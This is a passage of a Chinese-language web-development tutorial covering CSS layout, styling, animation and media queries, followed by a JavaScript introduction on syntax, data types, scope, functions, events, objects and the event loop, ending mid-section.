<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;  <span class="hljs-comment">/* 创建三列等宽布局 */</span><br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;  <span class="hljs-comment">/* 设置网格间距 */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>grid-template-columns</code> 定义列的布局，<code>gap</code> 定义网格项之间的间距。</p>
<hr>
<h3 id="常见-CSS-属性"><a href="#常见-CSS-属性" class="headerlink" title="常见 CSS 属性"></a>常见 CSS 属性</h3><h4 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h4><ul>
<li>**<code>color</code>**：设置文本颜色。</li>
<li>**<code>font-size</code>**：设置字体大小。</li>
<li>**<code>font-family</code>**：设置字体。</li>
<li>**<code>text-align</code>**：设置文本对齐方式。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>    <span class="hljs-attribute">font-family</span>: Arial, sans-serif;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h4><ul>
<li>**<code>background-color</code>**：设置元素的背景颜色。</li>
<li>**<code>background-image</code>**：设置背景图片。</li>
<li>**<code>background-position</code>**：设置背景图片的位置。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;background.jpg&#x27;</span>);<br>    <span class="hljs-attribute">background-position</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="显示与可见性"><a href="#显示与可见性" class="headerlink" title="显示与可见性"></a>显示与可见性</h4><ul>
<li>**<code>display</code>**：控制元素的显示方式。<ul>
<li><code>display: block</code>：设置元素为块级元素。</li>
<li><code>display: inline</code>：设置元素为行内元素。</li>
<li><code>display: none</code>：隐藏元素，不占据空间。</li>
</ul>
</li>
<li>**<code>visibility</code>**：设置元素的可见性。<ul>
<li><code>visibility: hidden</code>：隐藏元素，但保留空间。</li>
</ul>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="CSS-动画与过渡"><a href="#CSS-动画与过渡" class="headerlink" title="CSS 动画与过渡"></a>CSS 动画与过渡</h3><p>CSS 提供了简单的方式来创建动画效果和过渡效果。</p>
<ul>
<li><strong>过渡</strong>（Transition）：元素属性在一段时间内平滑变化。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: blue;<br>    <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.5s</span>;  <span class="hljs-comment">/* 过渡时间 0.5 秒 */</span><br>&#125;<br><br><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当鼠标悬停时，按钮背景颜色会在 0.5 秒内平滑过渡到红色。</p>
<ul>
<li><strong>动画</strong>：定义关键帧动画。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> example &#123;<br>    <span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">background-color</span>: red;&#125;<br>    <span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">background-color</span>: yellow;&#125;<br>&#125;<br><br><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">animation</span>: example <span class="hljs-number">2s</span> infinite;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该动画会让背景颜色从红色逐渐变为黄色，并持续重复。</p>
<hr>
<h3 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h3><p>响应式设计让网页能够适配不同设备的屏幕尺寸，如手机、平板、桌面显示器。</p>
<h4 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h4><p>媒体查询可以根据设备的屏幕大小，应用不同的样式。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">background-color</span>: lightblue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当屏幕宽度小于 600 像素时，背景颜色会变成浅蓝色。</p>
<hr>
<h3 id="CSS-优化技巧"><a href="#CSS-优化技巧" class="headerlink" title="CSS 优化技巧"></a>CSS 优化技巧</h3><ol>
<li><strong>合并样式</strong>：将相似的样式合并，减少重复代码。</li>
<li><strong>减少嵌套</strong>：尽量减少选择器嵌套的层次，以提高可读性和性能。</li>
<li><strong>使用类选择器</strong>：避免过度依赖 ID 选择器，类选择器的复用性更强。</li>
<li><strong>使用外部样式表</strong>：将 CSS 放在外部文件中，减少 HTML 文件的大小。</li>
</ol>
<hr>
<h1 id="JavaScript-详尽入门与指南"><a href="#JavaScript-详尽入门与指南" class="headerlink" title="JavaScript 详尽入门与指南"></a>JavaScript 详尽入门与指南</h1><h3 id="目录-6"><a href="#目录-6" class="headerlink" title="目录"></a>目录</h3><ol>
<li><a href="#javascript-%E5%9F%BA%E7%A1%80">JavaScript 基础</a><ul>
<li><a href="#javascript-%E7%AE%80%E4%BB%8B">JavaScript 简介</a></li>
<li><a href="#%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%BC%95%E5%85%A5-javascript">在网页中引入 JavaScript</a></li>
<li><a href="#javascript-%E8%AF%AD%E6%B3%95">JavaScript 语法</a></li>
</ul>
</li>
<li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a><ul>
<li><a href="#%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B">原始类型</a></li>
<li><a href="#%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B">对象类型</a></li>
</ul>
</li>
<li><a href="#%E5%8F%98%E9%87%8F%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F">变量与作用域</a><ul>
<li><a href="#%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E">变量声明</a></li>
<li><a href="#%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E9%97%AD%E5%8C%85">作用域与闭包</a></li>
</ul>
</li>
<li><a href="#%E6%8E%A7%E5%88%B6%E6%B5%81">控制流</a><ul>
<li><a href="#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">条件语句</a></li>
<li><a href="#%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5">循环语句</a></li>
</ul>
</li>
<li><a href="#%E5%87%BD%E6%95%B0">函数</a><ul>
<li><a href="#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E">函数声明</a></li>
<li><a href="#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">箭头函数</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">事件处理</a></li>
<li><a href="#%E5%AF%B9%E8%B1%A1%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B">对象与面向对象编程</a></li>
<li><a href="#%E5%BC%82%E6%AD%A5-javascript">异步 JavaScript</a><ul>
<li><a href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">回调函数</a></li>
<li><a href="#promise">Promise</a></li>
<li><a href="#asyncawait">async&#x2F;await</a></li>
</ul>
</li>
<li><a href="#javascript-%E4%B8%8E-dom">JavaScript 与 DOM</a><ul>
<li><a href="#dom-%E6%93%8D%E4%BD%9C">DOM 操作</a></li>
<li><a href="#%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A">事件绑定</a></li>
</ul>
</li>
<li><a href="#%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5">高级概念</a><ul>
<li><a href="#%E9%97%AD%E5%8C%85">闭包</a></li>
<li><a href="#%E5%8E%9F%E5%9E%8B%E9%93%BE">原型链</a></li>
</ul>
</li>
<li><a href="#%E8%B0%83%E8%AF%95%E4%B8%8E%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">调试与错误处理</a></li>
</ol>
<hr>
<h3 id="JavaScript-基础"><a href="#JavaScript-基础" class="headerlink" title="JavaScript 基础"></a>JavaScript 基础</h3><h4 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h4><p><strong>JavaScript</strong> 是一门动态的、基于事件驱动的编程语言，主要用于开发网页的客户端交互逻辑。它可以操作文档对象模型（DOM），实现用户点击、表单提交等交互操作。</p>
<hr>
<h4 id="在网页中引入-JavaScript"><a href="#在网页中引入-JavaScript" class="headerlink" title="在网页中引入 JavaScript"></a>在网页中引入 JavaScript</h4><p>你可以通过以下方式将 JavaScript 添加到 HTML 页面中：</p>
<ol>
<li><p><strong>内联 JavaScript</strong>：将 JavaScript 代码直接嵌入到 HTML 元素的 <code>onclick</code> 等事件属性中。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Hello World!&#x27;)&quot;</span>&gt;</span>点击我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>内部脚本</strong>：将 JavaScript 代码放在 <code>&lt;script&gt;</code> 标签中，位于 HTML 文档的 <code>&lt;head&gt;</code> 或 <code>&lt;body&gt;</code> 中。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, JavaScript!&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>外部脚本</strong>：将 JavaScript 代码放在外部文件中，通过 <code>&lt;script&gt;</code> 标签引用。</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;scripts.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<h4 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h4><p>JavaScript 的基础语法包括：</p>
<ul>
<li><strong>区分大小写</strong>：<code>myVariable</code> 与 <code>myvariable</code> 是两个不同的变量。</li>
<li><strong>语句结束符</strong>：每条 JavaScript 语句可以用分号（<code>;</code>）结束。</li>
<li><strong>注释</strong>：单行注释用 <code>//</code>，多行注释用 <code>/* */</code>。</li>
</ul>
<hr>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JavaScript 中的数据类型分为 <strong>原始类型</strong> 和 <strong>对象类型</strong>。</p>
<h4 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h4><ul>
<li><p><strong>Number</strong>：表示数字，如整数和浮点数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">25</span>;<br><span class="hljs-keyword">let</span> price = <span class="hljs-number">19.99</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>String</strong>：表示字符串，使用单引号或双引号。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Boolean</strong>：布尔值，只有两个取值：<code>true</code> 或 <code>false</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> isOpen = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>null</strong>：表示空值，通常用于表示“无”。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>undefined</strong>：表示变量已声明但未赋值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Symbol</strong>：表示唯一的标识符（较高级的使用场景）。</p>
</li>
</ul>
<h4 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h4><p>对象是属性的集合，用来存储键值对。每个属性有一个名字（键）和一个对应的值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="变量与作用域"><a href="#变量与作用域" class="headerlink" title="变量与作用域"></a>变量与作用域</h3><h4 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h4><p>在 JavaScript 中，可以使用三种方式声明变量：<code>var</code>、<code>let</code> 和 <code>const</code>。</p>
<ul>
<li><p><strong>var</strong>：<code>var</code> 是 JavaScript 中传统的变量声明方式，变量有函数作用域（但没有块作用域），并存在变量提升的问题。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>let</strong>：<code>let</code> 是 ES6 中引入的，用来声明块作用域变量，能有效避免变量提升和重复声明问题。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>const</strong>：<code>const</code> 声明常量，赋值后不能重新赋值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> z = <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="作用域与闭包"><a href="#作用域与闭包" class="headerlink" title="作用域与闭包"></a>作用域与闭包</h4><ul>
<li><strong>全局作用域</strong>：在函数外声明的变量具有全局作用域，所有地方都可以访问。</li>
<li><strong>函数作用域</strong>：在函数内部声明的变量只能在函数内部访问。</li>
<li><strong>块作用域</strong>：<code>let</code> 和 <code>const</code> 声明的变量具有块作用域，适用于 <code>&#123;&#125;</code> 包围的任意代码块。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">let</span> message = <span class="hljs-string">&quot;Hello!&quot;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// 报错，message 不在作用域内</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>JavaScript 支持 <code>if...else</code> 和 <code>switch</code> 语句，用于实现条件判断。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">20</span>;<br><br><span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">18</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;成年人&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;未成年&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><p>常见的循环结构有 <code>for</code>、<code>while</code> 和 <code>do...while</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h4><p>函数是 JavaScript 的核心概念，函数用于执行特定的任务或计算某些值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>));  <span class="hljs-comment">// 输出 &quot;Hello, Alice&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>箭头函数是 ES6 中引入的一种更简洁的函数表达方式，尤其适用于回调函数和匿名函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params">name</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>));<br></code></pre></td></tr></table></figure>

<p>当函数体只有一个表达式时，<code>return</code> 可以省略：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = name =&gt; <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>JavaScript 是基于事件驱动的语言，可以响应用户的各种交互，如点击、输入等。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;button id=<span class="hljs-string">&quot;myButton&quot;</span>&gt;点击我&lt;/button&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">let</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myButton&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;按钮被点击了！&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="对象与面向对象编程"><a href="#对象与面向对象编程" class="headerlink" title="对象与面向对象编程"></a>对象与面向对象编程</h3><p>JavaScript 是面向对象的语言，所有东西几乎都是对象。对象是属性和方法的集合。</p>
<h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><p>对象可以通过对象字面量、构造函数和 <code>class</code> 关键字创建。</p>
<ol>
<li><p><strong>对象字面量</strong>：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, I am &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>构造函数</strong>：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>Class（类）</strong>：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    &#125;<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-number">35</span>);<br></code></pre></td></tr></table></figure></li>
</ol>
<hr>
<h4 id="异步编程与事件循环的详细审计"><a href="#异步编程与事件循环的详细审计" class="headerlink" title="异步编程与事件循环的详细审计"></a>异步编程与事件循环的详细审计</h4><p>JavaScript 是单线程的，通过异步机制来处理非阻塞任务。异步编程是JavaScript编程中的重要部分。</p>
<ol>
<li><p><strong>事件循环的运行机制：</strong></p>
<ul>
<li><p><strong>事件循环</strong>负责处理任务队列（如定时器、I&#x2F;O 操作等），JavaScript引擎会持续检查任务队列并执行其中的任务。异步任务（如<code>setTimeout</code>、<code>Promise</code>、<code>async/await</code>）会被放入任务队列，等到主线程空闲时执行。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">js复制代码<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Start&quot;</span>);<br>setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Timeout callback&quot;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;End&quot;</span>);<br><span class="hljs-comment">// 输出顺序：Start -&gt; End -&gt; Timeout callback</span><br></code></pre></td></tr></table></figure>

<p><strong>审计重点：</strong>检查代码中的异步操作是否正确地处理了回调、Promise 的状态转换（resolved&#x2F;rejected），并确保异步操作不会阻塞主线程（如大量 DOM 操作和复杂计算在异步回调中执行）。</p>
</li>
</ul>
</li>
<li><p><strong><code>Promise</code>与<code>async/await</code>的正确使用：</strong></p>
<ul>
<li><p><code>Promise</code> 是处理异步任务的核心对象，通过<code>then</code>链式调用来处理成功和失败的情况。而<code>async/await</code>是<code>Promise</code>的语法糖，便于书写和理解。</p>
</li>
